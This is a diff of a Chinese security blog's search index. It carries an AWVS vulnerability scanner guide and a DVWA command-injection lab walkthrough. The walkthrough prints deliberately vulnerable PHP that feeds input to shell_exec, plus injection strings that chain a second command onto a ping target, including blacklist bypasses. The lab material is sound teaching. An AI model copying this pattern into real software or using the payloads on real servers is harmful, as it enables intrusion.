@@ -1,6 +1,70 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>AWVS的基本使用</title>
+    <url>/posts/22917.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5）<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS2.png" alt></p>
+<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Site-Crawler"><a href="#Site-Crawler" class="headerlink" title="Site Crawler"></a>Site Crawler</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS3.png" alt></p>
+<p>点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。</p>
+<h2 id="Target-Finder"><a href="#Target-Finder" class="headerlink" title="Target Finder"></a>Target Finder</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS4.png" alt></p>
+<p>可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。<br>进行了端口扫描后会进行服务发现，得到端口上对应的服务。</p>
+<h2 id="Subdomain-Scanner"><a href="#Subdomain-Scanner" class="headerlink" title="Subdomain Scanner"></a>Subdomain Scanner</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS5.png" alt></p>
+<p>用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） </p>
+<h2 id="Blind-SQL-Injector"><a href="#Blind-SQL-Injector" class="headerlink" title="Blind SQL Injector"></a>Blind SQL Injector</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS6.png" alt></p>
+<p>在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。</p>
+<h2 id="HTTP-Editor"><a href="#HTTP-Editor" class="headerlink" title="HTTP Editor"></a>HTTP Editor</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS7.png" alt><br>和BP repeater类似，可以进行手动漏洞挖掘探测。</p>
+<p><strong>Enocoder tool中可以进行各种加密解密</strong></p>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS8.png" alt></p>
+<h2 id="HTTP-Sniffer"><a href="#HTTP-Sniffer" class="headerlink" title="HTTP Sniffer"></a>HTTP Sniffer</h2><p>和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。</p>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS9.png" alt></p>
+<p>手动设置代理<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS10.png" alt></p>
+<h2 id="HTTP-Fuzzer"><a href="#HTTP-Fuzzer" class="headerlink" title="HTTP Fuzzer"></a>HTTP Fuzzer</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS11.png" alt></p>
+<p>类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 </p>
+<ul>
+<li>注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。</li>
+</ul>
+<h2 id="Authentication-Tester"><a href="#Authentication-Tester" class="headerlink" title="Authentication Tester"></a>Authentication Tester</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS12.png" alt></p>
+<p>认证测试，用于尝试破解破解账户密码。 </p>
+<p>基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。</p>
+<h2 id="Compare-Results"><a href="#Compare-Results" class="headerlink" title="Compare Results"></a>Compare Results</h2><p>可以用不同用户登录后结果进行比较，和BP Compare类似。</p>
+<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><h2 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS13.png" alt></p>
+<ul>
+<li>Client Certifications：有些Web Application需要客户端证书才能进行扫描。 </li>
+<li>Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence</li>
+</ul>
+<h2 id="Scan-Settings"><a href="#Scan-Settings" class="headerlink" title="Scan Settings"></a>Scan Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS14.png" alt></p>
+<ul>
+<li>Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。</li>
+</ul>
+<h1 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h1><ul>
+<li>点击New Scan</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS15.png" alt></p>
+<ul>
+<li>点击扫描配置就是Scan Setting页面</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS16.png" alt></p>
+<ul>
+<li>发现目标服务器基本信息</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS17.png" alt></p>
+<ul>
+<li>是否需要登录，可以使用login sequence</li>
+</ul>
+<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS18.png" alt></p>
+<ul>
+<li>finish，扫描结果可以保存为wvs文件，还能把结果制作成报表<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS19.png" alt></li>
+</ul>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Active_Directory</title>
     <url>/posts/35642.html</url>
     <content><![CDATA[<h1 id="Active-Directory-活动目录"><a href="#Active-Directory-活动目录" class="headerlink" title="Active Directory(活动目录)"></a>Active Directory(活动目录)</h1><p><strong>Active Directory</strong>（简称AD。）是微软Windows Server中，负责架构中大型网路环境的集中式目录管理服务（Directory Services），在Windows 2000 Server开始内建于Windows Server产品中，它处理在组织中的网路物件，物件可以是使用者，群组，电脑，网域控制站，邮件，设定档，组织单元，树系等等，只要是在Active Directory结构定义档（schema）中定义的物件，就可以储存在Active Directory资料档中，并利用Active Directory Service Interface来存取。</p>
@@ -358,70 +422,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>AWVS的基本使用</title>
-    <url>/posts/22917.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5）<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS2.png" alt></p>
-<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Site-Crawler"><a href="#Site-Crawler" class="headerlink" title="Site Crawler"></a>Site Crawler</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS3.png" alt></p>
-<p>点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。</p>
-<h2 id="Target-Finder"><a href="#Target-Finder" class="headerlink" title="Target Finder"></a>Target Finder</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS4.png" alt></p>
-<p>可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。<br>进行了端口扫描后会进行服务发现，得到端口上对应的服务。</p>
-<h2 id="Subdomain-Scanner"><a href="#Subdomain-Scanner" class="headerlink" title="Subdomain Scanner"></a>Subdomain Scanner</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS5.png" alt></p>
-<p>用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） </p>
-<h2 id="Blind-SQL-Injector"><a href="#Blind-SQL-Injector" class="headerlink" title="Blind SQL Injector"></a>Blind SQL Injector</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS6.png" alt></p>
-<p>在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。</p>
-<h2 id="HTTP-Editor"><a href="#HTTP-Editor" class="headerlink" title="HTTP Editor"></a>HTTP Editor</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS7.png" alt><br>和BP repeater类似，可以进行手动漏洞挖掘探测。</p>
-<p><strong>Enocoder tool中可以进行各种加密解密</strong></p>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS8.png" alt></p>
-<h2 id="HTTP-Sniffer"><a href="#HTTP-Sniffer" class="headerlink" title="HTTP Sniffer"></a>HTTP Sniffer</h2><p>和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。</p>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS9.png" alt></p>
-<p>手动设置代理<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS10.png" alt></p>
-<h2 id="HTTP-Fuzzer"><a href="#HTTP-Fuzzer" class="headerlink" title="HTTP Fuzzer"></a>HTTP Fuzzer</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS11.png" alt></p>
-<p>类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 </p>
-<ul>
-<li>注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。</li>
-</ul>
-<h2 id="Authentication-Tester"><a href="#Authentication-Tester" class="headerlink" title="Authentication Tester"></a>Authentication Tester</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS12.png" alt></p>
-<p>认证测试，用于尝试破解破解账户密码。 </p>
-<p>基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。</p>
-<h2 id="Compare-Results"><a href="#Compare-Results" class="headerlink" title="Compare Results"></a>Compare Results</h2><p>可以用不同用户登录后结果进行比较，和BP Compare类似。</p>
-<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><h2 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS13.png" alt></p>
-<ul>
-<li>Client Certifications：有些Web Application需要客户端证书才能进行扫描。 </li>
-<li>Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence</li>
-</ul>
-<h2 id="Scan-Settings"><a href="#Scan-Settings" class="headerlink" title="Scan Settings"></a>Scan Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS14.png" alt></p>
-<ul>
-<li>Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。</li>
-</ul>
-<h1 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h1><ul>
-<li>点击New Scan</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS15.png" alt></p>
-<ul>
-<li>点击扫描配置就是Scan Setting页面</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS16.png" alt></p>
-<ul>
-<li>发现目标服务器基本信息</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS17.png" alt></p>
-<ul>
-<li>是否需要登录，可以使用login sequence</li>
-</ul>
-<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS18.png" alt></p>
-<ul>
-<li>finish，扫描结果可以保存为wvs文件，还能把结果制作成报表<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS19.png" alt></li>
-</ul>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Apache Solr Velocity Template RCE漏洞复现</title>
     <url>/posts/57536.html</url>
     <content><![CDATA[<h2 id="0x00-Apache-Solr介绍"><a href="#0x00-Apache-Solr介绍" class="headerlink" title="0x00 Apache Solr介绍"></a>0x00 Apache Solr介绍</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p>
@@ -520,6 +520,45 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
+    <title>DVWA之Command Injection</title>
+    <url>/posts/28539.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>命令执行漏洞的原理：在操作系统中， &amp;  、&amp;&amp; 、|  、 ||   都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令<br>![](DVWA之Command Injection/CI1.jpg)</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，low级别的代码接收了用户输入的ip，然后根据服务器是否是Windows NT系统，对目标ip进行不同的ping测试。但是这里对用户输入的ip并没有进行任何的过滤，所以我们可以进行命令执行漏洞。</p>
+<p>我们ping一下百度的ip地址看看，可以看到能ping通</p>
+<p>![](DVWA之Command Injection/CI2.jpg)</p>
+<p>我们尝试输入 61.135.169.125 &amp; ipconfig  ,在操作系统中，”  &amp;  、&amp;&amp; 、|  、 ||   “都可以作为命令连接符使用,我们在ping完后再执行ipconfig 命令查看ip信息</p>
+<p>可以看到，成功执行。然后我们就可以继续执行我们的命令了。把ipconfig换成其他的系统命令<br>![](DVWA之Command Injection/CI3.jpg)</p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&amp;&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，medium级别的代码在low级别的代码上增加量了对 &amp;&amp; 和 ；的过滤，但是这并没有什么软用。</p>
+<p>我们根本就不用 &amp;&amp; ，我们直接用 &amp;</p>
+<p>&amp;&amp;和&amp;的区别在于，&amp;&amp;是执行完前面的命令然后执行后面的命令，&amp;是不管前面的命令是否值执行，后面的都执行</p>
+<p>可以看到，我们直接按照low级别的命令就可以绕过执行。<br>![](DVWA之Command Injection/CI4.jpg)</p>
+<p>由于使用的是<code>str_replace</code>把<code>”&amp;&amp;”</code>、<code>”;”</code>替换为空字符，因此可以采用以下方式绕过：</p>
+<p><code>61.135.169.125&amp;;&amp;ipconfig</code></p>
+<p>![](DVWA之Command Injection/CI5.jpg)</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，High级别的代码进行了黑名单过滤，把一些常见的命令连接符给过滤了。黑名单过滤看似安全，但是如果黑名单不全是话，是很容易进行绕过的。我们仔细看黑名单过滤中的<code>|</code>,<code>|</code>后面还有一个空格，所以我们可以进行绕过，输入下面命令。</p>
+<p><code>61.135.169.125|ipconfig</code></p>
+<p>![](DVWA之Command Injection/CI6.jpg)</p>
+<p><code>|</code>是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line">    $target &#x3D; stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Split the IP into 4 octects</span><br><span class="line">    $octet &#x3D; explode( &quot;.&quot;, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check IF each octet is an integer</span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) &#x3D;&#x3D; 4 ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; If all 4 octets are int&#39;s put the IP back together.</span><br><span class="line">        $target &#x3D; $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">            &#x2F;&#x2F; Windows</span><br><span class="line">            $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; *nix</span><br><span class="line">            $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;&#x2F;pre&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>stripslashes(string)</code>: 该函数会删除字符串<code>string</code>中的反斜杠，返回已剥离反斜杠的字符串。</p>
+<p><code>explode(separator,string,limit)</code>: 该函数把字符串打散为数组，返回字符串的数组。参数<code>separator</code>规定在哪里分割字符串，参数<code>string</code>是要分割的字符串，可选参数<code>limit</code>规定所返回的数组元素的数目。</p>
+<p><code>is_numeric(string)</code>: 该检测<code>string</code>是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p>
+<p>可以看到，Impossible级别的代码加入了<code>Anti-CSRF token</code>，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>DVWA之File Inclusion</title>
     <url>/posts/21204.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启<code>allow_url_include</code>选项时，就可以通过php的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的<code>allow_url_fopen</code>选项（选项开启之后，服务器允许包含一个远程的文件）。<br>![](DVWA之File Inclusion/FI1.jpg)</p>
@@ -550,8 +589,8 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>WEB</tag>
         <tag>DVWA</tag>
+        <tag>WEB</tag>
       </tags>
   </entry>
   <entry>
@@ -609,68 +648,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DVWA之Command Injection</title>
-    <url>/posts/28539.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>命令执行漏洞的原理：在操作系统中， &amp;  、&amp;&amp; 、|  、 ||   都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令<br>![](DVWA之Command Injection/CI1.jpg)</p>
-<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到，low级别的代码接收了用户输入的ip，然后根据服务器是否是Windows NT系统，对目标ip进行不同的ping测试。但是这里对用户输入的ip并没有进行任何的过滤，所以我们可以进行命令执行漏洞。</p>
-<p>我们ping一下百度的ip地址看看，可以看到能ping通</p>
-<p>![](DVWA之Command Injection/CI2.jpg)</p>
-<p>我们尝试输入 61.135.169.125 &amp; ipconfig  ,在操作系统中，”  &amp;  、&amp;&amp; 、|  、 ||   “都可以作为命令连接符使用,我们在ping完后再执行ipconfig 命令查看ip信息</p>
-<p>可以看到，成功执行。然后我们就可以继续执行我们的命令了。把ipconfig换成其他的系统命令<br>![](DVWA之Command Injection/CI3.jpg)</p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="核心代码-1"><a href="#核心代码-1" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; $_REQUEST[ &#39;ip&#39; ];</span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&amp;&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到，medium级别的代码在low级别的代码上增加量了对 &amp;&amp; 和 ；的过滤，但是这并没有什么软用。</p>
-<p>我们根本就不用 &amp;&amp; ，我们直接用 &amp;</p>
-<p>&amp;&amp;和&amp;的区别在于，&amp;&amp;是执行完前面的命令然后执行后面的命令，&amp;是不管前面的命令是否值执行，后面的都执行</p>
-<p>可以看到，我们直接按照low级别的命令就可以绕过执行。<br>![](DVWA之Command Injection/CI4.jpg)</p>
